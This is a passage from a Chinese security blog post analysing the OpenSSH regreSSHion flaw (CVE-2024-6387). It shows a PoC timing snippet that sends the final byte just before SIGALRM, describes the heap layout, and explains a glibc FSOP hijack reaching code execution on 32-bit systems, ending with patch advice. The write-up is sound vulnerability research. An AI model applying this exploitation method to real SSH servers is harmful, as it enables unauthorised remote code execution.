<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Precise timing for last byte</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">start</span>, <span class="title">current</span>;</span></span><br><span class="line">clock_gettime (CLOCK_MONOTONIC, &amp;start);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    clock_gettime (CLOCK_MONOTONIC, &amp;current);</span><br><span class="line">    <span class="type">double</span> elapsed = (current.tv_sec - start.tv_sec)</span><br><span class="line">                     + (current.tv_nsec - start.tv_nsec) / <span class="number">1e9</span>;</span><br><span class="line">    <span class="keyword">if</span> (elapsed &gt;= (LOGIN_GRACE_TIME - parsing_time - <span class="number">0.001</span>))</span><br><span class="line">      &#123; <span class="comment">// 1ms before SIGALRM</span></span><br><span class="line">        <span class="keyword">if</span> (send (sock, &amp;final_packet[<span class="keyword">sizeof</span> (final_packet) - <span class="number">1</span>], <span class="number">1</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">          &#123;</span><br><span class="line">            perror (<span class="string">&quot;send last byte&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>发送最后一个字节后，服务端发现这是一个算法协商报文，因此会多次调用 <code>cert_parse</code> 函数进行解析。POC 精心构造了这个超长报文，使得 <code>cert_parse</code> 将会循环 54 次解析过程，每次解析过程都会调用一次 <code>malloc</code> 函数。POC 能够让 SSHd 以 0x4096、0x304（<code>FILE</code> 结构体的大小）、0x4096、0x304、… 的顺序调用 <code>malloc</code> 函数分配内存，使得在后面的一段时间内，SSHd 会进行一系列的内存分配，同时由于超时，SSHd 将异步地执行另外的内存分配。在此之前，由于我们分配的 8KB、320 Bytes 内存中的任意内容均可控，因此完全可以提前在 320 byte 的 chunk 中写好伪造的 <code>FILE</code> 结构体与虚假的过大的 remainder size。这样一来，只要 <code>syslog</code> 抢在 remainder size 更新前将虚大的 remainder 分配出去，就能够使 remainder 部分覆盖 <code>syslog</code> 获取的 <code>FILE</code> 结构体。</p>
<p>注意：由于 0x320 chunk 位于 tcache，因此 <code>syslog</code> 获取 <code>FILE</code> 结构体并不会切分 remainder，这个操作是由后面分配 4KB 的读缓冲区触发的。切分 remainder 后，还会剩下一个小 remainder，<code>_int_malloc</code> 一更新这个小 remainder 的相关字段，就完成了对 <code>syslog</code> 的 <code>FILE</code> 结构体的破坏。</p>
<p><img src="2.png" alt="" /></p>
<h2 id="c4-fsop"><a class="markdownIt-Anchor" href="#c4-fsop"></a> C.4 FSOP</h2>
<p>该漏洞在32位下可以通过 FSOP 完成利用，这主要是考虑到 32 位系统的 ASLR 保护不完善，Glibc 只能映射到两个基地址：0xb7400000 或 0xb7200000。这正给了攻击者做文章的机会。</p>
<p>在上一节，我们提到通过更新 remainder 的 相关字段，能够达到破坏 <code>FILE</code> 结构体的效果。具体而言，它实际上是修改了 <code>FILE</code> 结构体中的 <code>_vtable_offset</code> 字段：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  </span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>如果猜测 Glibc 的映射基地址为 0xb7400000，那么 last remainder 的 <code>fd</code> 指针与 <code>bk</code> 指针指向 unsorted bin 后，其值应该为 0xb761d7f8（随 Glibc 版本不同而不同，但高 2 字节基本都相同），反映到上面的 <code>FILE</code> 结构体中，则是将 <code>_vtable_offset</code> 修改为 <code>bk</code> 指针的第 3 个字节——0x61。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Glibc 2.36, /malloc/malloc.c, line 4024</span></span><br><span class="line"></span><br><span class="line">  remainder_size = size - nb;</span><br><span class="line">  remainder = chunk_at_offset (victim, nb);</span><br><span class="line">  unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">  av-&gt;last_remainder = remainder;</span><br><span class="line">  remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>
<p>在 Glibc 中，对于文件读写等操作的相关函数是统一保存在一个个 vtable 中的，实际执行时需要首先访问 vtable，再获取其中的函数指针以调用执行。将 <code>_vtable_offset</code> 改为 0x61 后，<code>syslog</code> 的 <code>__fread_unlocked</code> 将会找到 <code>_IO_wfile_jumps</code> 这个 vtable，选择其中的 <code>_IO_wfile_underflow</code> 函数执行（正常情况下应该是执行 <code>_IO_file_jumps</code> 中的 <code>_IO_file_underflow</code>）。在 <code>_IO_wfile_underflow</code> 中，存在下面的调用链：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_underflow     // Glibc 2.36, /libio/wfileops.c, line 110</span><br><span class="line">  __libio_codecvt_in    // Glibc 2.36, /libio/iofwide.c, line 161</span><br><span class="line">    DL_CALL_FCT         // Glibc 2.36, /iconv/skeleton.c, line 153</span><br></pre></td></tr></table></figure>
<p>需要注意的是，<code>fopen</code> 并没有对 <code>FILE</code> 结构体的 <code>_codecvt</code> 字段进行初始化，因此依然可以通过提前布置值完成对该字段的控制。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_codecvt        // Glibc 2.36, /libio/libio.h, line 114</span><br><span class="line">  _IO_iconv_t             // Glibc 2.36, /libio/libio.h, line 50</span><br><span class="line">    __gconv_step          // Glibc 2.36, /iconv/gconv.h, line 83</span><br><span class="line">      __gconv_fct __fct</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>从上面的结构定义层次来看，我们需要的 <code>__fct</code> 函数指针经过多层结构包装。为了让提前写入的指针能够完整地构建调用链，攻击者可以选择将 <code>_codecvt</code> 写成 Glibc 的 bins 的地址，这样实际就是让 Glibc 将我们释放的 chunk 的前面一小部分看做 <code>_IO_iconv_t</code> 结构，接下去如法炮制，在已经释放的 chunk 中完成精心构造，即可让代码最终执行我们伪造的 <code>__fct</code> 函数指针，完成任意代码执行。</p>
<h1 id="d-相关挑战"><a class="markdownIt-Anchor" href="#d-相关挑战"></a> D. 相关挑战</h1>
<p>该漏洞的利用较为困难，这主要是因为猜测 ASLR 与时间窗口竞争叠加的结果。</p>
<p>地址空间布局随机化（Address Space Layout Randomization）是一种常用的程序运行时保护方式，多次执行时，同一个段会映射到不同的内存地址。但 glibc 在32位下实际上只会映射到 0xb7400000 或 0xb7200000，因此实现 FSOP 还是有可能的。但是时间竞争窗口较小，导致总体成功率依然极低（实验室环境下6~8小时尝试平均10000次才能成功）。在 64 位强化 ASLR 中，通过猜测 glibc 加载地址进行攻击的利用方式就更加无法实现了，需要通过其他的方式完成漏洞利用。</p>
<h1 id="e-总结"><a class="markdownIt-Anchor" href="#e-总结"></a> E. 总结</h1>
<p>CVE-2024-6387 是一个高危的未授权任意代码远程执行漏洞，虽然目前的攻击方式较为复杂，攻击成功所需时间较长，但其危害仍不容忽视。建议升级 OpenSSH 至 9.8v1 及更高版本，或通过防火墙等方式缓解风险。</p>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2024/07/01/PHP-pwn-%E5%AD%A6%E4%B9%A0-2/" rel="prev" title="PHP pwn 学习 (2)">
      <i class="fa fa-chevron-left"></i> PHP pwn 学习 (2)
    </a></div>
      <div class="post-nav-item">
    <a href="/2024/07/08/CodeQL%E5%AD%A6%E4%B9%A0-1/" rel="next" title="CodeQL学习 (1)">
      CodeQL学习 (1) <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#a-%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="nav-number">1.</span> <span class="nav-text"> A. 漏洞成因</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#b-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">2.</span> <span class="nav-text"> B. 漏洞利用前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#b1-%E7%9B%B8%E5%85%B3-ssh-%E5%8D%8F%E8%AE%AE%E6%8A%A5%E6%96%87%E6%A0%BC%E5%BC%8F"><span class="nav-number">2.1.</span> <span class="nav-text"> B.1 相关 SSH 协议报文格式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#b2-glibc-%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E7%9B%B8%E5%85%B3%E8%A7%84%E5%88%99"><span class="nav-number">2.2.</span> <span class="nav-text"> B.2 Glibc 内存分配相关规则</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#c-poc"><span class="nav-number">3.</span> <span class="nav-text"> C. POC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#c1-%E5%A0%86%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80"><span class="nav-number">3.1.</span> <span class="nav-text"> C.1 堆内存布局</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#c2-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%A7%A3%E6%9E%90%E6%95%B0%E6%8D%AE%E6%97%B6%E9%97%B4%E6%B5%8B%E9%87%8F"><span class="nav-number">3.2.</span> <span class="nav-text"> C.2 服务端解析数据时间测量</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#c3-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="nav-number">3.3.</span> <span class="nav-text"> C.3 条件竞争</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#c4-fsop"><span class="nav-number">3.4.</span> <span class="nav-text"> C.4 FSOP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#d-%E7%9B%B8%E5%85%B3%E6%8C%91%E6%88%98"><span class="nav-number">4.</span> <span class="nav-text"> D. 相关挑战</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#e-%E6%80%BB%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text"> E. 总结</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">CoLin</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">163</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">26</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Hornos3" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Hornos3" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://blog.csdn.net/qq_54218833?spm=1000.2115.3001.5343" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_54218833?spm&#x3D;1000.2115.3001.5343" rel="noopener" target="_blank"><i class="fa fa-crosshairs fa-fw"></i>CSDN</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">CoLin</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">站点总字数：</span>
    <span title="站点总字数">1.5m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">23:01</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
